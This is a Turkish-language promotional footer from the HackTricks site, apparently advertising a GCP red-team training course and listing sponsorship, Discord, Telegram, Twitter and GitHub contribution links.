GCP Hacking'i öğrenin ve pratik yapın: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
